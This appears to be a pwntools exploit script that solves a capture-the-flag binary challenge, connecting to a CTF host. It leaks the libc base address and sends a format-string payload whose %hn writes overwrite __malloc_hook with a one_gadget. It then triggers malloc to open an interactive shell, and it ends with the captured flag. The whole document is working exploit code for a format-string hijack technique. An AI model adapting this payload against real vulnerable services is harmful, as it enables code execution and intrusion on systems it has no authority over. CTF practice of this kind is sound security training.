#!/usr/bin/python3
from pwn import * 

exe = ELF('./app_patched', checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)
context.binary  = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x0000000000000986
		brva 0x000000000000091D
		brva 0x0000000000000958
		b* malloc
		b* __malloc_hook
		c
		''')

if args.REMOTE:
	HOST = 'challenges.ctf.sd'
	PORT = 34999
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

#GDB()
#input()
ru(b'Clue: ')
libc.address = leak_hex(rl(p)[:-1], libc.sym._IO_2_1_stdout_)
info("Libc Base: ", libc.address)

one_gadget = libc.address + 0x4527a
package = {
	one_gadget & 0xffff : libc.sym.__malloc_hook,
	one_gadget >> 16 & 0xffff : libc.sym.__malloc_hook + 2,
	one_gadget >> 32 & 0xffff : libc.sym.__malloc_hook + 4,
}

temp = sorted(package)

pld = b'%c%c%c%c%c'
pld += b'%c' * 15
pld += f'%{temp[0] - 20}c%hn'.encode()
pld += f'%{temp[1] - temp[0]}c%hn'.encode()
pld += f'%{temp[2] - temp[1]}c%hn'.encode()
pld = pld.ljust(0x70, b'\0')
pld += p64(package[temp[0]]) + p64(0)
pld += p64(package[temp[1]]) + p64(0)
pld += p64(package[temp[2]])

sla(b'path:\n', pld)

sla(b'again:\n', b'%100000c')
p.interactive()

# 0xL4ugh{Z0R0_F1N4LLY_F0UND_TH3_FM7_P47H_2c8377716f9780d3}